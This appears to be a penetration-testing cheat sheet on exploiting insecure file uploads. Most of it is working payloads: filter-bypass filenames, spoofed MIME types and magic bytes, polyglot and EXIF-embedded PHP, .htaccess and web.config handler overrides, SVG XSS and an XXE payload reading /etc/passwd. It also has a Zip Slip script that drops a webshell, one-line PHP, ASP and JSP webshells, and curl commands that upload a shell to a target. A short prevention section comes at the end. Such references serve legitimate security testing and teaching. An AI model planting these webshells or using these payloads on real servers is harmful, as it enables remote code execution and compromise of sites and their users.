# Insecure File Upload

## Description
File upload vulnerabilities occur when a web application allows users to upload files without properly validating file type, content, or name. This can lead to remote code execution, defacement, or serving malicious content to users.

## Bypass Techniques

### 1. Extension Bypass

#### Double Extensions
```
shell.php.jpg
shell.php.png
shell.php.gif
shell.php.txt
```

#### Alternative PHP Extensions
```
.php
.php3
.php4
.php5
.php7
.phtml
.phar
.phps
.pht
.pgif
.inc
```

#### Case Manipulation
```
shell.pHp
shell.PhP
shell.PHP
shell.pHP5
```

#### Null Byte Injection (PHP < 5.3.4)
```
shell.php%00.jpg
shell.php%00.png
shell.php\x00.jpg
```

#### Special Characters
```
shell.php.
shell.php..
shell.php...
shell.php%20
shell.php%0a
shell.php%0d%0a
shell.php/
shell.php.\
```

#### Double Extension with Null
```
shell.php%00.gif
shell.php\x00.gif
shell.php%00%00.gif
```

### 2. Content-Type Bypass

#### Changing MIME Type
```http
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: application/octet-stream
```

#### Double Content-Type
```http
Content-Type: image/png
Content-Type: application/x-php
```

### 3. Magic Bytes Bypass

Add file signature before PHP code:

#### GIF
```php
GIF89a
<?php system($_GET['cmd']); ?>
```

#### PNG
```php
\x89PNG\r\n\x1a\n
<?php system($_GET['cmd']); ?>
```

#### JPEG
```php
\xFF\xD8\xFF\xE0
<?php system($_GET['cmd']); ?>
```

#### PDF
```php
%PDF-1.5
<?php system($_GET['cmd']); ?>
```

### 4. Polyglot Files

Create files valid as multiple formats:

#### GIFAR (GIF + JAR)
```bash
# Create a file that is both valid GIF and JAR
cat image.gif payload.jar > gifar.gif
```

#### PHP in JPEG EXIF
```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg shell.php.jpg
```

### 5. .htaccess Upload

If .htaccess can be uploaded:

```apache
# Make .txt files execute as PHP
AddType application/x-httpd-php .txt

# Or use handler
<FilesMatch "shell.txt">
    SetHandler application/x-httpd-php
</FilesMatch>
```

### 6. web.config Upload (IIS)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
```

## File Type-Specific Attacks

### SVG with XSS
```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
    <circle cx="50" cy="50" r="40"/>
</svg>
```

### SVG with XXE
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg>&xxe;</svg>
```

### PDF with JavaScript
```
%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert('XSS'))
>>
>>
endobj
```

### ZIP with Path Traversal (Zip Slip)
```python
import zipfile

with zipfile.ZipFile('evil.zip', 'w') as z:
    z.writestr('../../../var/www/html/shell.php', '<?php system($_GET["cmd"]); ?>')
```

## Common Shells

### PHP Webshell
```php
<?php system($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php eval($_POST['cmd']); ?>
```

### Minimal PHP Shell
```php
<?=`$_GET[c]`?>
```

### ASP Webshell
```asp
<%eval request("cmd")%>
```

### JSP Webshell
```jsp
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
%>
```

## Bypass Checklist

### Client-Side Validation
```javascript
// Bypass by:
// 1. Disable JavaScript
// 2. Intercept request with Burp
// 3. Modify file extension after selection
```

### Server-Side Checks

| Check | Bypass |
|-------|--------|
| Extension blacklist | Alternative extensions, double extensions |
| Extension whitelist | Null byte, special chars |
| Content-Type header | Modify header in request |
| Magic bytes | Add valid file header |
| File content | Polyglot files, metadata injection |
| Image validation | GD/ImageMagick processing |
| Filename length | Test limits |

## Tools

### Fuxploider
```bash
# Automated file upload vulnerability scanner
python fuxploider.py --url https://target.com/upload
```

### Upload Scanner (Burp Extension)
```
1. Install from BApp Store
2. Right-click upload request
3. Send to Upload Scanner
4. Configure payloads and run
```

### Manual Testing
```bash
# Test with curl
curl -X POST -F "file=@shell.php;type=image/jpeg" https://target.com/upload

# Change filename
curl -X POST -F "file=@shell.php;filename=shell.php.jpg" https://target.com/upload
```

## Prevention

```php
// Whitelist allowed extensions
$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif'];
$extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
if (!in_array($extension, $allowed_extensions)) {
    die('Invalid file type');
}

// Verify MIME type using fileinfo
$finfo = new finfo(FILEINFO_MIME_TYPE);
$mime = $finfo->file($tmp_path);
$allowed_mimes = ['image/jpeg', 'image/png', 'image/gif'];
if (!in_array($mime, $allowed_mimes)) {
    die('Invalid file type');
}

// Rename uploaded files
$new_name = bin2hex(random_bytes(16)) . '.' . $extension;

// Store outside webroot
$upload_path = '/var/uploads/' . $new_name;  // Not in /var/www/html

// Set proper permissions
chmod($upload_path, 0644);
```

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
- https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
- https://portswigger.net/web-security/file-upload
